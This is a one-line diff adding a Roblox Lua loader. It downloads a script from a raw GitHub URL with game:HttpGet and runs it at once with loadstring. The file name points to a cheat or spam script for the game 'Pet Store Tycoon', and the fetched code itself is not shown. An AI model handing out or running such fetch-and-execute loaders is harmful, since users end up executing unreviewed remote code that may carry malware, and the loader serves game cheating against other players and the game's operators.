@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/pet-store-tycoon-spam4-ihmq6u6agwbo7s.lua"))()
